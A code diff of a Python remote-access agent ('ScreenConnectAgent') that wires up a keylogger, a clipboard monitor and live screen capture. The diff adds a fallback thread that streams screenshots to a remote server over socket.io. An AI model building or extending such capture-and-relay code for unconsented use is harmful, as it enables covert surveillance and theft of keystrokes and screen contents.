@@ -653,11 +653,6 @@ _adv_last_frame_pkt:  Optional[bytes] = None
 _adv_sio_async  = None   # socketio.AsyncClient — set when async loop starts
 _adv_viewers    = 0
 _adv_authed     = False
-_main_sio_ref   = None  # set by main() so adv tasks can reach the main socket for fallback
-
-def _get_main_sio():
-    """Return the main socket.io client so the adv task can use it as a frame fallback."""
-    return _main_sio_ref
 _adv_loop: Optional[asyncio.AbstractEventLoop] = None
 _adv_thread: Optional[threading.Thread] = None
 _adv_pool   = ThreadPoolExecutor(max_workers=2, thread_name_prefix="adv-enc")
@@ -666,23 +661,18 @@ _adv_pool   = ThreadPoolExecutor(max_workers=2, thread_name_prefix="adv-enc")
 async def _adv_task_stream_frames():
     """Second-site frame streaming loop — continuous, no ACK gate."""
     global _adv_last_frame_pkt
-    # FIX: retry capture init instead of returning early — returning exits asyncio.gather
-    # which disconnects the adv socket and breaks streaming permanently.
-    capture = None
-    frame   = None
-    for _attempt in range(10):
+    capture = None; frame = None
+    for _att in range(10):
         try:
-            capture = _make_capture()
-            frame   = capture.grab()
-            if frame is not None:
-                break
-            log.warning(f"Advanced Monitor: grab returned None (attempt {_attempt+1}) — retrying in 2s")
+            capture = _make_capture(); frame = capture.grab()
+            if frame is not None: break
+            log.warning(f"Advanced Monitor: grab None (attempt {_att+1})")
         except Exception as _ce:
-            log.warning(f"Advanced Monitor: capture init error ({_ce}) — retrying in 2s")
+            log.warning(f"Advanced Monitor: capture init error ({_ce})")
             capture = None
         await asyncio.sleep(2)
     if capture is None or frame is None:
-        log.error("Advanced Monitor: capture failed after 10 attempts — stream task exiting"); return
+        log.error("Advanced Monitor: capture failed after 10 attempts — exiting"); return
 
     h, w = frame.shape[:2]
     encoder, enc_flag = _make_encoder(w, h, CONFIG["STREAM_FPS"], CONFIG["STREAM_QUALITY"])
@@ -931,14 +921,88 @@ async def _adv_main(server_url: str, token: str):
 
 _adv_monitor_started = False  # ensure we only start it once
 
+
+# ── Main-socket screenshot fallback ─────────────────────────────────────────
+# When the adv socket fails to auth, this thread streams screenshots via the
+# main socket so both Advanced Monitor and Live Viewer show frames.
+_fb_thread: threading.Thread = None
+_fb_stop    = threading.Event()
+
+def _start_screenshot_fallback(sio_client):
+    """Launch a screenshot-via-main-socket fallback if not already running."""
+    global _fb_thread, _fb_stop
+    if _fb_thread and _fb_thread.is_alive():
+        return
+    _fb_stop.clear()
+
+    def _fb_loop():
+        log.info("Screenshot fallback: starting main-socket frame relay")
+        import struct as _struct
+        FLAG_JPEG = 0x02
+        FRAME_HDR = _struct.Struct(">IIQII")
+        fps = CONFIG.get("STREAM_FPS", 15)
+        quality = CONFIG.get("STREAM_QUALITY", 70)
+        interval = 1.0 / max(1, min(fps, 15))  # cap at 15fps for main socket
+        cap = None
+        try:
+            cap = _make_capture()
+        except Exception as e:
+            log.warning(f"Screenshot fallback: capture init failed: {e}")
+            return
+        n = 0
+        while not _fb_stop.is_set():
+            try:
+                # Stop if adv socket is now working
+                if _adv_authed and _adv_sio_async and _adv_sio_async.connected:
+                    log.info("Screenshot fallback: adv socket now active — stopping fallback")
+                    break
+                if _adv_viewers == 0:
+                    time.sleep(0.1); continue
+                frame = cap.grab()
+                if frame is None:
+                    time.sleep(interval); continue
+                h, w = frame.shape[:2]
+                ok, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, quality])
+                if not ok:
+                    time.sleep(interval); continue
+                payload = buf.tobytes()
+                ts_us   = int(time.time() * 1_000_000)
+                header  = FRAME_HDR.pack(w, h, ts_us, FLAG_JPEG, len(payload))
+                pkt     = header + payload
+                if sio_client and sio_client.connected:
+                    sio_client.emit("screenshot_result", {
+                        "device_id": CONFIG["DEVICE_TOKEN"],
+                        "frame":     base64.b64encode(pkt).decode(),
+                        "w": w, "h": h,
+                        "_raw_bin":  True,
+                    })
+                    # Also emit frame_bin_relay (binary fallback for adv viewers)
+                    sio_client.emit("frame_bin_relay", {
+                        "device_id": CONFIG["DEVICE_TOKEN"],
+                        "data": list(pkt),
+                    })
+                n += 1
+                time.sleep(interval)
+            except Exception as e:
+                log.debug(f"Screenshot fallback loop error: {e}")
+                time.sleep(1)
+        if cap:
+            try: cap.close()
+            except: pass
+        log.info("Screenshot fallback: stopped")
+
+    _fb_thread = threading.Thread(target=_fb_loop, daemon=True, name="fb-screenshot")
+    _fb_thread.start()
+
+
 def start_advanced_monitor(server_url: str, token: str):
     """Launch the async advanced monitor engine in a dedicated thread."""
     global _adv_loop, _adv_thread, _adv_monitor_started
-    # FIX: check thread liveness, not just the flag — thread may have died silently
+    # FIX: check actual thread liveness — flag alone misses crashed threads
     if _adv_monitor_started and _adv_thread and _adv_thread.is_alive():
         log.info("Advanced Monitor already running — skipping restart")
         return
-    if _adv_monitor_started and not (_adv_thread and _adv_thread.is_alive()):
+    if _adv_monitor_started:
         log.warning("Advanced Monitor thread died — restarting")
     _adv_monitor_started = True
 
@@ -2006,9 +2070,7 @@ class ScreenConnectAgent:
 
     def _make_client(self):
         """Create a brand-new socketio.Client on every reconnect."""
-        global _main_sio_ref
         sio         = socketio.Client(logger=False, engineio_logger=False, reconnection=False)
-        _main_sio_ref = sio  # allow adv tasks to reach the main socket for frame fallback
         sys_monitor = SystemMonitor(sio)
         keylogger   = KeyLogger(sio)
         clipboard   = ClipboardMonitor(sio)
@@ -2086,14 +2148,15 @@ class ScreenConnectAgent:
                 action = data.get("action", "start")
                 if action == "start":
                     # FIX: If viewer_count never arrived on the adv socket (race condition),
-                    # this request_action "start" on the main socket is our fallback trigger.
-                    # Bump _adv_viewers so the stream loop wakes up immediately.
+                    # bump _adv_viewers so the stream loop wakes up immediately.
                     global _adv_viewers
                     if _adv_viewers == 0:
                         _adv_viewers = 1
                         log.info("Monitor start via request_action — forced _adv_viewers=1 (adv socket race fallback)")
+                    # Always start screenshot fallback — no-op if adv socket is working
+                    _start_screenshot_fallback(sio)
                 elif action == "stop":
-                    pass  # stream loop will pause when viewer_count goes to 0
+                    _fb_stop.set()
             elif tab in ("mouse_event", "scroll_event", "frame_ack"):
                 pass  # handled by Advanced Monitor engine
 
